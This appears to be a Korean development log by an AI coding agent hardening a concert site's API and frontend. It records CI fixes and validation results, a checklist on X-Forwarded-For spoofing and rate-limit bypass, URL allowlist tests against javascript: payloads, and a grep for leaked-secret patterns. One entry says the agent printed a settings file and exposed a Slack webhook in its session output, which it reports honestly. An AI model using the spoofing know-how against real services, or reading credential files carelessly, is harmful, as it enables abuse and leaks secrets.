| 기동 실패 6종 | `CORS_ALLOWED_ORIGINS` 4종(대문자 호스트라 정규형 오류로 걸린 http 항목·자격증명·2번째 항목의 형식 오류·와일드카드), `TRUST_PROXY_HOPS` 2종(문자·상한 초과) → **exit 1, 입력 표식 노출 0줄**, 메시지는 항목 위치와 이유 범주. **"http는 루프백만" 메시지 자체는 실제 기동으로는 확인하지 않았고 단위 테스트로만 확인했다**(런타임 입력이 대문자 호스트라 정규형 검사에서 먼저 걸렸다) |
| 정상 기동 | `http://localhost:3010,https://admin.example.com` 기동 성공 |
| DB 연결 불가 서버 | 응답 500 고정 문구 4건 통과. 로그는 요청당 `PrismaClientKnownRequestError(code=P1001) GET /health/db → 500` **한 줄**(허용 목록에 없으므로 메시지·위치 없음), 금지 문자열 10종 **0줄** |
| `TRUST_PROXY_HOPS=1` 기동 | `WARN [Bootstrap] TRUST_PROXY_HOPS=1: …` 한 줄. 미설정 기동에는 없음 |
| **DB 스냅샷 diff = 0** | 6개 테이블의 행 수·내용 해시와 5개 시퀀스 `last_value`가 §16 검증 절의 기준선과 **동일**. 시퀀스 소모 없음 |

#### 트러블슈팅 기록 (교차 리뷰 반영 중)

**1) 정규식을 도구를 거쳐 쓰다 두 번 잘못 저장됐다.** ① 제어문자 제거 정규식에 쓴 `  `가 저장되면서 **실제 줄 구분 문자로 풀려** 정규식 리터럴이 끊겼다(컴파일 오류로 즉시 드러남). ② 이를 유니코드 카테고리로 바꾸는 치환에서 백슬래시가 소실돼 `\p{Cc}`가 **`p{Cc}`로 저장**됐다 — 이것은 **컴파일이 통과하는 잘못된 동작**(글자 `p`·`{`·`}`를 지우는 코드)이었다. 스크립트 문자열의 이스케이프 계층이 원인이라 정규식이 든 수정은 Edit 도구로 직접 하기로 했다. 재발을 막으려고 제어문자 제거 테스트를 **결과 문자열 정확 비교**로 쓰고, 일반 글자(`p{Cc} plain`)가 지워지지 않는 케이스를 넣었다. 같은 계열의 이스케이프 오류가 테스트 코드에서도 두 번 있었다(`toContain()`이 빈 인자가 되고 개행이 실제 줄바꿈으로 풀림, 정규식 `[\/]`가 `[\\/]`가 아니었음) — 모두 실행·검토로 잡아 고쳤다.

**2) 스파이 호출 기록이 테스트 간에 누적됐다.** 통합 계약 스펙의 `Logger.prototype.error` 스파이는 재사용되는데 호출 기록을 비우지 않아, 기존 `boom` 테스트의 `toHaveBeenCalledTimes(1)`이 **우연히 첫 번째라서** 통과하고 있었다. 새 테스트가 끼자 2회로 잡혔다. `beforeEach`에서 `mockClear()`를 하도록 고쳤다(기존 테스트가 옳게 통과하고 있던 이유가 순서였다는 점이 이번에 드러났다).

**3) 첫 시도에서 L3 테스트를 M3 커밋에 넣었다.** Proxy 예외 객체가 던지는 지점은 로그가 아니라 **응답 결정 단계**(`instanceof`의 `getPrototypeOf` 트랩)라 L3 범위였다. 커밋 단위가 각자 통과하도록 L3 커밋으로 옮겼다.

**4) 간헐 실패 1건 관측(미조치).** 전체 테스트 5회 중 1회 `common/cors.spec.ts`의 첫 테스트가 **5,053ms로 기본 타임아웃(5초)을 넘겨** 실패했다. 단독 실행과 전체 3회 재실행은 모두 통과했다. 로직 실패가 아니라 **CPU 경합 시 Nest 앱 최초 생성이 느려진 것**으로 보이며(전체 실행의 누적 import 시간이 300초 이상), 이번에 추가한 300요청 통합 테스트가 부하를 늘렸을 가능성이 있다. 지시 범위 밖이라 `vitest` 설정은 건드리지 않았다 — 반복되면 `testTimeout` 상향을 검토한다(**미확인**: 원인을 부하로 단정할 근거는 재현하지 못한 상태의 추정이다).

**5) CI를 GitHub에서 처음 돌리자 web 잡의 `npm ci`가 실패했다 (로컬 시뮬레이션이 놓친 것).**
`apps/api` 잡은 통과했고 루트 `web` 잡만 8초 만에 `EUSAGE`로 실패했다(사용법 출력이 붙는 형태라 로그 화면에는 원인 줄이 보이지 않았다). 러너의 `24.x`는 Node 24.21.0과 **npm 11.19.0**을 번들하는데, 로컬 시뮬레이션은 npm 11.6.2였다. 같은 npm 버전으로 재현하니 정확히 이 오류가 났다: `Missing: @emnapi/runtime@1.11.3 from lock file`, `Missing: @emnapi/core@1.11.3 from lock file`.
- **원인**: 잠금 파일에 `@emnapi/core`·`runtime`이 `@unrs/resolver-binding-wasm32-wasi` 안쪽의 중첩본(1.10.0)으로만 있고 최상위에는 없었다. 최상위의 `@napi-rs/wasm-runtime@1.1.4`(옵셔널)가 둘을 **peer**로 요구하는데 예전 npm이 그 항목을 잠금에 적지 않았다. 신형 npm은 이를 불일치로 보고, 구형은 통과시킨다
- **조치**: npm 11.19.0으로 `npm install --package-lock-only`를 실행해 잠금 파일을 재생성했다(`5e85c09`). **패키지 8개 추가 + 기존 17개 항목의 peer 표시**뿐이고 버전 변경 0·삭제 0이다
- **검증**: 수정 전 잠금은 npm 11.19.0에서 실패, 수정 후는 11.19.0·11.6.2 모두 `npm ci --dry-run` 통과. `.env`·환경변수 없는 깨끗한 복제본에서 npm 11.19.0으로 **실제 `npm ci`와 `npm run lint` 통과**. `apps/api` 잠금도 11.19.0 dry-run 통과. **수정 후 GitHub에서의 재실행 결과는 아직 확인하지 못했다**
- 앞서 "로컬 시뮬레이션은 Windows·Node 24.12에서 했다"고 한계로 적어 둔 바로 그 유형이다. CI 사전 실측을 러너와 같은 npm 버전으로 했다면 잡혔다 — 이후 CI 관련 검증은 `npx npm@<러너 번들 버전>`로 한다
- **남은 경고(실패 아님)**: 같은 설치 로그에 npm 11.19.0의 `install-scripts` 경고가 있다 — `sharp@0.34.5`·`unrs-resolver@1.12.2`의 install 스크립트가 `allowScripts`로 아직 허용되지 않았다는 내용이다. 지금은 경고일 뿐이지만 이후 npm이 기본 차단으로 바꾸는지는 **확인하지 않았다(미확인)**. §16 L12(`npm ci --ignore-scripts` 검토)와 함께 볼 것

#### 기록만 하는 것

**M1 — `TRUST_PROXY_HOPS` 배포 체크리스트** (틀리면 요청 제한 우회 또는 전 사용자 단일 IP 집계로 관리자 로그인이 잠긴다. 아래 실험 근거는 교차 리뷰 때 `express`로 직접 확인한 `req.ip`다: 홉 수가 실제 프록시보다 크거나 프록시 없이 앱 포트에 직접 접속하면 **위조한 `X-Forwarded-For`가 `req.ip`가 된다**):

1. **앱 포트(3001)는 프록시에서만 접근 가능해야 한다.** 보안 그룹/방화벽으로 외부 직접 접근을 막는다. 현재 `main.ts`의 `app.listen(PORT)`는 호스트를 지정하지 않아 모든 인터페이스에 바인딩한다 — 배포 시 `127.0.0.1` 바인딩 또는 보안 그룹으로 제한하는 것을 함께 검토한다(코드는 이번에 바꾸지 않았다)
2. **프록시가 클라이언트가 보낸 `X-Forwarded-For` 뒤에 실제 IP를 덧붙이는지 확인한다**(nginx: `proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;`). 받은 헤더를 그대로 전달하는 설정은 위조를 그대로 통과시킨다
3. **홉 수 = 실제 프록시 수.** nginx 한 대면 1이다. ALB·CDN이 앞에 붙으면 단계마다 더한다
4. **배포 서버에서 실측한다(필수).** (a) 없는 계정으로 로그인을 6번 시도해 429를 만든 뒤, `X-Forwarded-For`를 바꿔 다시 시도해도 **429가 유지**되는지(위조가 무효인지) (b) **다른 네트워크의 클라이언트**(예: 모바일 데이터)에서는 429가 **아닌지**(전 사용자가 한 IP로 집계되고 있지 않은지) (c) 기동 로그에 `WARN [Bootstrap] TRUST_PROXY_HOPS=…` 경고가 있는지
5. 틀렸을 때의 증상: **우회**(값이 크거나 앱 포트가 열려 있음) — 로그인 5회 제한이 무력화된다 / **전 사용자 단일 IP 집계**(프록시가 있는데 0) — 익명 공격자가 15분마다 5요청으로 관리자 로그인을 계속 잠그고 기본 300/분 한도도 전원이 공유한다
6. 인스턴스가 늘거나 프로세스가 재시작되면 인메모리 카운터가 초기화된다(I3)

**L2** — `AllExceptionsFilter.catch`가 `getType() !== 'http'`이면 응답도 로그도 없이 반환한다. 지금은 HTTP뿐이지만 WebSocket·RPC를 추가하는 순간 그 컨텍스트의 예외가 조용히 사라진다. 그때 컨텍스트별 처리를 넣는다.

**L4** — 어댑터의 치환 표에 없는 본문 파서 4xx(예: `request.aborted`)는 필터가 `warn` 로그를 요청마다 남긴다. 클라이언트가 연결 중단만으로 로그를 부풀릴 수 있다. 필요하면 표에 추가하거나 로그 수준을 낮춘다.

**L5 — 관리자 UI는 제출 전 검증이 필요하다.** 로그인 한도(5분 5회)는 **성공한 로그인과 DTO 400(빈 값 등)도 센다.** 오타를 5번 내면 6번째에는 **올바른 비밀번호여도 15분 잠긴다**(차단 중 재요청은 차단을 연장하지 않는다 — 저장소 소스로 확인). UI는 (a) 빈 값·길이를 서버로 보내기 전에 막고 (b) 429의 `Retry-After`(CORS로 노출돼 있다)를 "N분 뒤 다시 시도"로 보여 주고 (c) 실패가 누적되기 전에 남은 시도 횟수를 알려 줄 수 없다는 점(`X-RateLimit-*`를 일부러 숨겼다)을 감안해 문구를 정해야 한다.

**L6** — 카운트 키에 클래스·핸들러 이름이 들어가 한도가 **라우트별**이다(IP당 300×라우트 수). 미지정 라우트 404·preflight·본문 파서 실패는 Guard보다 앞에서 끝나 **제한이 없다.** 필요하면 프록시(nginx `limit_req`)에서 총량을 함께 제한한다.

**L7** — `/health/db`도 클래스 수준 `@SkipThrottle()`이다(결정 사항). 유효한 토큰이 유출되면 `count` 3건짜리 쿼리를 제한 없이 부를 수 있다. 배포 플랫폼의 헬스체크는 `GET /health`만 쓰고, 필요하면 `/health/db`의 제한을 다시 켠다.

**L9** — `app.setup.ts`의 주석 "요청 값·접속 호스트가 응답과 로그에 남지 않게"는 **과장**이다. `HttpException`은 그대로 통과하고, 요청에서 온 값을 메시지에 끼우는 곳이 있다: `teams.service.ts:159`(`팀 id 형식이 올바르지 않습니다: ${teamId}`), `:173`(`${dto.day}`), `:220`(`${day}`), `:233`(`${key}`). 값은 정규식·길이 검증을 거치고 요청자 본인에게만 돌아가므로 **유출은 아니다.** 다만 `ReorderTeamsDto.teamIds`의 각 항목은 `/^\d+$/`만 검사하고 **길이 상한이 없어**, 본문 100KB 한도까지의 숫자열이 400 응답으로 되돌아간다(증폭). 이번에 코드도 주석도 바꾸지 않았다.

**L12** — CI의 `npm ci`가 의존성 install 스크립트를 실행한다. 비밀값이 없어 영향은 러너로 한정되지만 `--ignore-scripts`를 검토할 수 있다(`prisma`·`@node-rs/argon2`가 install 스크립트를 필요로 하는지 확인이 먼저다 — 확인하지 않았다).

**I1** 로그인 창이 슬라이딩이라 꾸준히 시도하면 IP당 시간당 약 60회는 가능하다. **I2** IPv6는 /64로 묶이고 `::ffff:a.b.c.d`는 IPv4와 같은 버킷이다(더 큰 대역을 가진 공격자는 버킷을 돌릴 수 있다). **I3** 저장소가 인메모리라 프로세스 재시작마다 한도가 초기화된다. **I4** CORS preflight는 거부된 오리진에도 204와 `Allow-Methods/Headers/Max-Age`를 내려준다(`cors` 패키지 동작, `Allow-Origin`이 없어 브라우저는 거부한다).

#### 이 절에서 의도적으로 하지 않은 것

- 위 "기록만" 항목의 코드 수정(특히 앱 포트 바인딩 호스트, `teamIds` 길이 상한, `/health/db` 제한, 파서 4xx 로그 수준)
- `vitest` 설정(간헐 타임아웃), `npm ci --ignore-scripts`
- `ubuntu-26.04` 채택(GA 아님)

### 롤백

코드 변경만이고 **DB·스키마 변경이 없다**(마이그레이션 0개). 되돌리려면 브랜치를 되돌리면 된다. 환경변수(`CORS_ALLOWED_ORIGINS`·`TRUST_PROXY_HOPS`)는 코드가 없어지면 무시된다. 되돌리면 `/health`가 다시 행 수를 공개하고 깨진 JSON이 본문 앞 10자를 에코하는 상태로 돌아간다.

### 완료 상태 및 다음 단계

- 브랜치 `feature/api-hardening`, 푸시·PR 보류
- **다음**: 공개 프론트 버그 수정 → 관리자 UI(`apps/admin`, 별도 Vercel 프로젝트) → 배포(EC2 서울 1순위) → 59곡 유튜브 배치·리뷰. 위 "남겨둔 결정"의 배포 값 3가지(`TRUST_PROXY_HOPS`·`CORS_ALLOWED_ORIGINS`·권한 회수 실행)는 배포 시점에 정한다

## 17. work02-7b — 공개 프론트 버그 수정: 일차 판정 통일 · 유튜브 폴백 제거(검색 결과 링크로 대체) (2026-09-22)

- **날짜**: 2026-09-22
- **브랜치**: `feature/public-frontend-fixes` (`feature/api-hardening`은 커밋과 원격 upstream이 있고 PR #38로 머지돼 이름만 바꿀 수 없어, 로컬 `develop`을 `origin/develop`(`16986ca`)로 fast-forward한 뒤 새로 분기했다)
- **커밋**: 일차 판정 통일 + 공용 모듈 `488e505` / 캐러셀 노출·모달 가짜 곡 제거 `806224f` / 유튜브 폴백 제거 + 검색 링크 `e4d1505` / `open-track-video` 방어 `6b8758e` / 문서(이 섹션)
- **관련 PR**: work02-7b, `fix: 공개 프론트 일자 판정 통일, 유튜브 폴백 제거(검색 결과 링크로 대체)` (푸시/PR 생성은 보류)
- **상태**: 구현·검증 완료. **DB 쓰기·스키마 변경 0건**(프로덕션은 SELECT만), `apps/api`·관리자 UI·배포는 건드리지 않았다. 의존성 추가 없음(`package.json`·`package-lock.json` 변경 없음)

### 배경

관리자 UI(7c)로 **실제 팀을 등록하기 전에** 공개 프론트의 알려진 버그를 고치는 단계다. §10이 "7단계 전 확인 항목"으로 미뤄 온 프론트 항목(id 범위 폴백, 홈 캐러셀 노출, `open-track-video` 예외 처리, 프론트 실시간 폴백)을 한 번에 처리한다. 공개 사이트(summit-concert.live)를 직접 고치는 단계라 **프로덕션 15행 기준 화면 차이 0**이 최우선 조건이었다.

### 구현 전 조사 (실측)

**id 범위 폴백의 복사본과 차이** — 같은 이름의 함수가 두 페이지에 서로 다르게 있었고, 캐러셀에는 없었다.

| 항목 | `setlist/page.tsx` | `event-goods/page.tsx` | `card-carousel.tsx` |
| --- | --- | --- | --- |
| 일차 판정 | id 1~7→1, 8~14→2, **그 외 null(제외)** | id 1~7→1, **8 이상 전부 2(상한 없음)** | 없음(day 문자열을 라벨로만 사용) |
| 팀명 폴백 | 14개 이름, 15 이상 `Team N` | 15개 이름, 16 이상 `Team N` | 없음(이름 없으면 제외) |
| 이미지 폴백 | 1~14 매핑, 그 외 `/day1-team1.png` | 15→`day2-team8`, 그 외 `/day1-team1.png` | 없음(이미지 없으면 제외) |
| `normalizeImageSource` | 기준본 | 동일 동작 | **다름**: `http`로 *시작만* 해도 통과(나머지는 `http://`·`https://`여야 통과) |

**화면 도달 여부(렌더링 분기까지 읽고 판정)**

| 폴백 | `/setlist` | `/event-goods` |
| --- | --- | --- |
| 일차 추정 | 도달 | 도달(2일차 탭에 섞임) |
| 팀명 | 도달 | 도달 |
| 이미지 | **도달**(정정, 아래) | 페이로드에만 있고 **도달하지 않음** |

**프로덕션 데이터(읽기 전용)**: Line Up 15행 전부 `day`=`day1`/`day2`, `image_src`·`team_name` 채워짐 → **폴백이 호출되는 행이 0개**(죽은 코드). 곡은 팀당 4~6개(곡 0개 팀 없음), 64곡 중 `youtube_url`이 있는 곡은 5곡(id 27·30·59·62·63).

**day3 이상이 들어오면(수정 전)**: `/event-goods`는 2일차 탭에 섞이고, `/setlist`는 신규 팀(id 15 이상)의 카드가 제외돼 어디에도 안 보이며, 홈 캐러셀은 라벨이 `day3 Artist`로 나온다. 서버는 `/^day[1-9]\d*$/`를 허용하므로 실제로 등록될 수 있다.

**같은 계열로 새로 발견한 것**
- `setlist-view.tsx`: 팀에 곡이 0개면 하드코딩 가짜 곡(Twilight 등)이 모달에 떴다(클릭하면 그 곡명으로 유튜브 검색). 관리자가 팀만 먼저 등록하는 순간 방문자에게 도달한다
- `setlist/page.tsx` 상단의 `setlistCards`(14팀 하드코딩): Supabase가 빈 응답을 주거나 오류가 나면 **옛 라인업**이 노출된다(지연발생 없음, 팀명도 DB와 다름) — **이번에 건드리지 않았다**(아래)

> **정정 (§10의 "이미지 폴백은 도달하지 않는다"에 대한 정정의 정정)**: `/setlist`에서는 **`day` 문자열이 `day1`/`day2`와 일치하고 `image_src`가 비어 있으면 도달했다.** `getDayFromRow`가 문자열 매칭을 id 범위보다 먼저 하므로 id가 15 이상이어도 카드가 만들어지고, 이미지가 `/day1-team1.png`(8C8 사진)로 채워져 `LineupCard`·모달이 그대로 그렸다. 기준선(`16986ca`) 소스를 그대로 실행한 정적 픽스처(id 16, `day2`, `image_src` NULL)로 확인했다 — **브라우저 화면 재현은 아니다**(서버 컴포넌트가 프로덕션 Supabase를 읽어 픽스처를 주입할 수 없다). 이번 단계에서 이 경로를 제거했다.

**open-track-video 흐름과 팝업 차단**: `youtubeUrl`이 있으면 `new URL()`(try/catch 없음) 후 앵커 클릭으로 열었고(클릭 핸들러 안 동기 → 차단 없음), 없으면 `window.open("", "_blank")`를 동기로 연 뒤 fetch 결과로 이동했다. 창이 차단돼 `win`이 null이면 fetch 뒤 비동기 앵커 클릭이 차단될 수 있다고 **추정**한다(브라우저별 동작 미확인).

**검색 URL 인코딩(Node 실측)**: `encodeURIComponent`는 공백을 `%20`, 괄호를 그대로 두고, `URLSearchParams`는 공백을 `+`, 괄호를 `%28%29`로 바꾼다. 둘 다 `&`→`%26`, `+`→`%2B`, `#`→`%23`으로 안전하다.

### 작업 내용

1. **일차 판정 통일** (`src/lib/line-up.ts`, `src/lib/image-source.ts`): `parseDay`는 `dayN`(서버 `DAY_PATTERN`과 같은 형식, 대소문자·앞뒤 공백 허용)만 인정하고 나머지는 null. id 범위로 일차·팀명·이미지를 추정하는 폴백 3종을 모두 제거. `DayType`을 `1|2`에서 `number`로 넓히고, 일차 탭은 **데이터에 있는 일차만 숫자순으로 동적 생성**한다(`/setlist`는 카드가 있는 일차, `/event-goods`는 곡이 있는 팀이 있는 일차). 두 페이지에 복사돼 있던 곡 그룹핑(`buildTracksByTeamId`)과 `normalizeImageSource`(엄격형)도 한 곳으로 정리했다. 화면에 도달하지 않던 `team.imageSrc`/`selectedCard.imageSrc` 곡 커버 폴백을 제거하고 `TeamPlaylist.imageSrc` 필드를 삭제했다(`TeamPlaylist` 타입은 `src/types/setlist.ts`로 이동, `event-goods/types.ts` 삭제)
2. **노출 규칙**: 홈 캐러셀은 팀명 + 이미지 + 유효한 day(`dayN`)가 있는 팀만 노출. `/setlist` 카드는 일차 + 팀명 + 이미지가 있는 팀만(다른 팀 사진으로 대체하지 않음). `/setlist` 모달은 곡이 없으면 가짜 곡 대신 "등록된 곡이 없습니다."를 보여 준다
3. **유튜브 폴백 제거 + 검색 링크**: `src/app/api/youtube/top-video/route.ts`와 점수 로직 삭제(키를 URL 쿼리 `key=`로 보내던 경로가 코드에서 사라짐). `youtube_url`이 없는 곡은 "곡명 가수" 검색 결과 페이지를 클릭 핸들러 안에서 **동기적으로** 새 탭에 연다(검색어는 백엔드 배치 `buildSearchQuery`와 같은 NFC·공백 정규화, 인코딩은 `URLSearchParams`). 곡 행의 원형 표시는 `TrackActionIndicator`로 분리해 영상이 있으면 `▶`, 없으면 돋보기(`title="유튜브에서 검색"`)로 구분하고, 곡 버튼에 `aria-label`("곡명 – 가수 영상 재생 (새 탭)" / "… 유튜브에서 검색 (새 탭)")을 붙였다
4. **`open-track-video` 방어**: `new URL()`을 try/catch로 감싸고 http(s) + YouTube 호스트 허용 목록(`youtube.com`, `www.`·`m.`·`music.youtube.com`, `youtu.be`)만 통과시킨다. 벗어나면(파싱 불가·`javascript:`·`data:`·다른 호스트·호스트 위장) 검색 결과로 대체한다. 아이콘·`aria-label` 판정(`hasPlayableVideo`)도 같은 검증을 써서 표시와 실제 동작이 어긋나지 않는다. `autoplay=1` 부착 규칙은 그대로 유지했다(자동 재생이 실제로 동작하는지는 미확인 — 브라우저 정책에 좌우된다)

### 기술 판단

| 쟁점 | 결정 | 이유 |
| --- | --- | --- |
| id 범위 추정 | **제거**(`dayN`만 인정) | 프로덕션 15행이 전부 `dayN`이라 영향이 없고, 서버 계약과 같은 형식이다. 알 수 없는 팀은 일차 기반 화면에서 제외 |
| 일차 탭 | 데이터에서 동적 생성(노출되는 일차만) | 곡·카드가 없는 day3 탭이 미리 생기지 않는다. 프로덕션은 1·2일차 그대로 |
| 공용화 | `src/lib`에 순수 함수로 | 복사본 3벌이 이번 버그의 구조적 원인. 순수 함수라 픽스처 검증이 가능했다 |
| `normalizeImageSource` 통합 | 엄격형(`http://`·`https://`) | 캐러셀의 `http`-시작 값 처리가 달라지지만 프로덕션 15건·앨범 64건에는 해당 값이 없어 결과 동일(아래 검증) |
| 커밋 ⑤를 ①에 합침 | 합침 | ①의 공용 빌더가 `normalizeImageSource`를 쓰므로 나누면 중간 커밋에 임시 복사본이 필요했다. 캐러셀의 채택은 ②에 포함 |
| 캐러셀 노출 | 이미지 + 유효 day + 팀명 | 팀 등록 → 이미지 업로드 사이의 미완성 팀이 홈에 나가지 않게 한다 |
| `/setlist` 카드 | 이미지가 있는 팀만 | 이미지가 없을 때 다른 팀 사진(8C8)이 나가는 경로를 없앤다 |
| 폴백 제거(B안) | 라우트·점수 로직 삭제, 검색 링크로 대체 | 폴백의 1위가 사람이 승인한 영상과 5/5 달랐고(§15 게이트 2), 키를 URL 쿼리로 보냈으며, 점수 로직이 두 벌이라 드리프트 위험이 있었다 |
| 링크 열기 방식 | 기존 앵커 클릭 헬퍼(동기) | 이미 검증된 방식이고 팝업 차단이 없다. 마크업(`<button>`)을 바꾸지 않아 디자인 변화가 없다 |
| 표시 구분 | `▶` vs 돋보기 + `aria-label`/`title` | 검색 결과 페이지로 가는 것을 재생처럼 보이게 하지 않는다 |
| YouTube 호스트 허용 목록 | 적용 | 서버는 `https://www.youtube.com/watch?v=…`만 저장하지만 work03 대량 삽입은 검증을 안 거친다 |

### 검증

| 항목 | 결과 |
| --- | --- |
| 루트 `npm run lint` | 통과(경고 0) |
| 루트 `npm run build` | 통과. 라우트 목록에서 **`/api/youtube/top-video` 소멸**(`/`, `/book`, `/event-goods`, `/setlist` 등 10개) |
| `npm ci` | 스크래치패드 복사본에서 루트 `package.json`·`package-lock.json`으로 통과, **잠금 파일 해시 전후 동일**, 이 브랜치의 루트 `package*.json` 변경 없음. 로컬 npm 11.6.2 / Node 24.12 — **러너의 정확한 npm 버전은 미확인** |
| 서버 HTML·RSC 페이로드(`/`, `/setlist`, `/event-goods`) 전후 diff | 빌드 ID·청크 해시·React 내부 22자 ID를 가리고 **의도한 변경만 되돌린 뒤 6개(3경로×HTML/RSC) 전부 동일.** 의도한 변경 = 돋보기 표시·`aria-label`·`/event-goods` 페이로드의 `imageSrc` 필드 제거 |
| Playwright 전후 DOM(`innerText`·이미지 src/alt 해시) | 14개 시나리오(PC 1280 / 모바일 390 × 홈·`/setlist` 1·2일차·모달 2종·`/event-goods` 1·2일차) **전부 일치**(돋보기는 `▶`로 되돌려 비교). 홈 캐러셀은 실데이터 15장으로 기준선과 동일 |
| 전후 스크린샷 | 바이트 비교는 **의미 없음**(변경 없는 홈도 애니메이션 때문에 매번 다름). `/setlist` 2일차 전후를 눈으로 비교해 동일, `/event-goods` 2일차에서 URL이 없는 곡의 돋보기와 `▶`(id 59·62·63) 표시를 확인 |
| 클릭: 영상 있는 곡(id 27·30·59·62·63) | 저장된 URL + `&autoplay=1`로 새 탭(5건 모두 DB 값과 일치) |
| 클릭: 영상 없는 곡(id 1 `0+0`, id 4 `Vancouver2 (BAND Ver.)`, id 28) | `…results?search_query=0%2B0+…`, `…Vancouver2+%28BAND+Ver.%29+BIG+Naughty+%28…%29`로 새 탭. 모달에서도 동일. 클릭 핸들러 안 동기 호출이라 팝업 차단 없음(Playwright 데스크톱) |
| 픽스처(순수 함수) | `parseDay` 17개 입력, `normalizeImageSource` 16개 입력, 링크 해석 13개 입력(잘못된 URL·`javascript:`·`data:`·다른 호스트·호스트 위장·`ftp:`), 검색어 6종(`&`·`+`·`#`·`%`·괄호·NFD 한글) — 실패 0건 |
| 프로덕션 행 옛 코드 vs 새 코드 | 기준선 소스를 그대로 실행해 Line Up 15 / Setlist 64로 비교: `/setlist` 카드 15개·팀별 곡 목록, `/event-goods` 일차별 팀·곡이 **동일**(제거한 `imageSrc` 제외) |
| 정적 픽스처 F1~F6(옛→새) | F1 day3 팀: 옛 `/setlist` 카드 없음·`/event-goods` 2일차에 섞임 → 새 3일차 탭 신설. F2 `day2`+이미지 NULL: 옛 `/setlist` 카드에 `/day1-team1.png` → 새 카드 없음. F3 day 빈 값·F5 팀명 공백·F6 `2일차` 형식: 옛 2일차로 분류/`Team 19` 표시 → 새 제외. F4 곡 0개: 새 모달 안내. **기존 15팀 카드는 모든 픽스처에서 불변** |
| 브라우저 픽스처(`/zz-verify` 임시 페이지, 삭제함) | `/setlist` 탭 1·2·3일차, 3일차 카드, 곡 없는 팀 모달의 "등록된 곡이 없습니다."·가짜 곡 없음, `/event-goods` 탭이 곡 있는 일차만(1·3), 잘못된 링크·비 YouTube 호스트 클릭이 검색 결과로 이동(모달 4곡은 페이지 예외 0건) |
| 캐러셀 픽스처(요청 가로채기) | 프로덕션 15 + day3 1(노출) + 이미지 없음·day 빈 값·`2일차`·팀명 공백 4(제외) = **16장**, 16번째 카드 `삼일차팀 / day3 Artist` |
| 제거 확인 | `git grep -nE "top-video\|YOUTUBE_API_KEY\|googleapis\|calculateVideoScore\|[?&]key="` — `src`·설정·CI **0건**. `apps/api`와 이 문서의 이력을 제외한 나머지는 **문서 4줄**(`prd-admin.md:202,206` 취소선·이력 서술, `work-02-nest.js.md:42,53` 이력 서술)이며 모두 "제거됨"을 덧붙였다. 아래 트러블슈팅 4 참고 |
| 비밀값 패턴(`sb_secret_`, `eyJ`, `AIza`, `postgres://…:…@`, Slack 웹훅) | 이 브랜치가 추가한 파일 0개(파일 이름만 출력해 확인) |

**미확인**: 모바일 YouTube 앱으로 열리는지, 스크린리더가 실제로 어떻게 읽는지(`aria-label`이 붙은 것만 DOM으로 확인), Vercel 프리뷰 결과, 팝업 차단 정책의 실제 브라우저별 동작(Playwright 데스크톱 한 가지만), `autoplay=1`의 실제 효과.

### 트러블슈팅 기록

1. **`next build`가 오래된 `.next/dev/types/validator.ts` 때문에 타입 오류로 실패** — 폴백 라우트를 삭제한 뒤 이전 `next dev` 산출물이 삭제된 `top-video/route.js`를 import하고 있었다(`tsconfig`가 `.next/dev/types`를 포함한다). 소스 문제가 아니라 로컬 캐시라서 `.next/dev`를 지우고 재빌드해 해결했다(`.next`는 gitignore). CI·Vercel의 깨끗한 체크아웃에서는 발생하지 않는다고 **추정**한다(확인하지 않음)
2. **캐러셀의 공백-only 팀명이 노출 조건을 통과** — 요청 가로채기 픽스처(팀명 `"  "`)에서 기대 16장이 17장으로 나와 발견했다. 캐러셀만 `team_name`을 `trim()`하지 않았다(기존 동작도 같았다). 프로덕션 15행에 앞뒤 공백이 있는 팀명이 0건임을 확인하고 `trim()`을 추가해 ②에 fixup으로 합쳤다. 순수 함수 빌더는 애초에 `trim`을 쓰고 있어서 브라우저 픽스처로만 잡혔다
3. **검증 측정 오류 두 건** — (a) 요청 가로채기(`page.route`)가 페이지 객체에 **남아** 다음 측정("실데이터")에도 픽스처가 응답해 카드가 16장·해시 불일치로 나왔다. 실제 회귀가 아니라 측정 오염이었고, `unrouteAll` 뒤 재측정에서 15장·기준선과 해시 일치를 확인했다. (b) 비교 스크립트의 정규식 이스케이프 오류로 "차이 있음"이 전부 나왔다(`\\*`가 리터럴 `*`로 해석됨). 수정 후 6개 동일. 둘 다 코드 결함이 아니다
4. **`git grep "key="`는 JSX `key={…}` 수십 건이 잡힌다**(사용자 지정 패턴의 범위가 넓다). URL 쿼리 전송에 한정한 `[?&]key=`로 좁히면 코드 0건이다. 또한 저장소에 커밋된 `dist/assets/index-*.js`(Vite 빌드 산출물, §3-6)에 `googleapis`·`key=` 문자열이 있으나 이 앱의 코드가 아니다
5. **설정 파일의 비밀값이 세션 출력에 노출** — 권한 설정 확인 중 `.claude/settings.local.json`의 앞부분을 출력해 `SLACK_WEBHOOK_URL` 값이 세션 기록에 남았다(파일은 gitignore이며 커밋되지 않았다). 값은 이 문서에 옮기지 않았다. 재발급 여부는 사용자가 판단한다. 이후 설정 파일은 열지 않았다

### 이 단계에서 의도적으로 하지 않은 것

- **`apps/api`(백엔드)**, **DB 스키마·데이터**, **관리자 UI**, **배포·인프라**, **`apps/web` 이동**
- **이미지 최적화(`unoptimized` 제거)·Lighthouse 성능 작업(§3~§5)·analytics 설치·`/event-goods` 라우트 리네이밍**
- **`setlist/page.tsx`의 하드코딩 `setlistCards`** — Supabase가 **빈 응답을 주거나 오류가 나면 오래된 라인업(14팀, 지연발생 없음, 옛 팀명)이 노출될 수 있다.** 이번에는 건드리지 않고 기록만 한다(제거하면 장애 시 빈 화면이 된다는 트레이드오프)
- **캐러셀 하단 라벨(`day1 Artist`)** — 7c로 이월
- 도달할 수 없는 코드가 된 `isPosterDummy`/`DummyPosterArtwork` 분기 정리, 테스트 러너·Playwright 패키지 추가(의존성), CI web 잡의 타입 검사·빌드 추가, 캐러셀의 클라이언트 fetch → 서버 컴포넌트 전환, 캐러셀 정렬(현재 `id` 순, `performanceOrder`·일차를 쓰지 않는다)
- `apps/api/.env.example`·낡은 주석·`frontendScore` 복사본 테스트 정리 (아래)

### 남겨둔 결정 (7c로 이월)

- **`apps/api`의 낡은 참조** (이번에 수정하지 않았다. 앞선 조사 보고의 "6곳"은 정확하지 않았고, 정확한 목록은 아래다)

| 위치 | 내용 | 조치 |
| --- | --- | --- |
| `youtube-score.ts:4`, `youtube-score.spec.ts:8` | "프론트 `top-video/route.ts`의 스코어링을 그대로 옮긴 것" | 삭제된 파일을 가리킴. `frontendScore` 복사본과 "폴백 1위가 다를 수 있다" 특성 테스트는 근거 기록으로만 남음 — 유지/삭제 결정 필요 |
